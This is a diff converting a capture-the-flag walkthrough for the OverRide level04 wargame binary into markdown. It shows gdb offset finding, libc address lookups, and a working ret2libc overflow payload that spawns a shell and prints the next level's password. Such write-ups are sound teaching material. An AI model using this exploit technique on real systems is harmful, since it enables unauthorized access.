@@ -1,3 +1,16 @@
+# OverRide — Level04 Walkthrough
+
+## Binary Analysis
+
+The binary uses a parent/child model:
+
+- the child process calls `gets()` on a 32-byte buffer,
+- the parent monitors the child with `ptrace()`,
+- if the child reaches syscall `11` (`execve`), the parent kills it.
+
+Decompiled code:
+
+```c
 int	main(int c, char **argv)
 {
 	pid_t	ach;
@@ -26,7 +39,7 @@ int	main(int c, char **argv)
 			return 0;
 		}
 		v = ptrace(PTRACE_PEEKUSER, ach, 44, 0);
-		if (v == 11) // enter if syscall is made on child
+		if (v == 11)
 		{
 			puts("no exec() for you");
 			kill(ach, 9);
@@ -36,34 +49,78 @@ int	main(int c, char **argv)
 
 	return 0;
 }
-this program use gets which is vulnerable to buffer overflow
+```
 
-(this program use child process to check child process in gdb use "set follow-fork-mode child" before running program)
+## Vulnerability
 
-we can find offset with buffer overflow pattern generator. (offset = 156)
+`gets()` is unsafe and allows a stack buffer overflow.
 
-we gonna use ret2lib exploit
+Even with the `execve` anti-shellcode check, we can use a ret2libc payload and call `system("/bin/sh")`.
 
-in gdb when program is running we need to find system address and "/bin/sh" string:
+## Exploitation
 
-system address:
+### Step 1: Find the offset
+
+Because the target input is in the child process, follow the child in `gdb`:
+
+```bash
+(gdb) set follow-fork-mode child
+```
+
+Then crash with a cyclic pattern:
+
+```bash
+level04@OverRide:~$ gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) r
+Starting program: /home/users/level04/level04
+[New process 3736]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3736]
+0x41326641 in ?? ()
+```
+
+Offset found: **156** bytes.
+
+### Step 2: Resolve ret2libc targets
+
+Get `system()` address:
+
+```bash
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+```
 
-for "/bin/sh" string we need to find the start of the libc address:
+Get libc range:
 
+```bash
 (gdb) info sharedlibrary
 From        To          Syms Read   Shared Object Library
 0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
 0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6
+```
 
-then we can search inside libc to find our string
+Find `"/bin/sh"` in libc:
 
+```bash
 (gdb) find 0xf7e42f70, +99999999, "/bin/sh"
 0xf7f897ec
+```
 
-then we can build our exploit
+### Step 3: Build and run payload
 
-(we put "\x00\x00\x00\x00" for the return address because we dont need for the shell to exit clean)
+```bash
+level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7"'; cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
 
-(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\x00\x00\x00\x00" + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
+## Result
+
+Successfully gained access as `level05` and recovered the next level password.
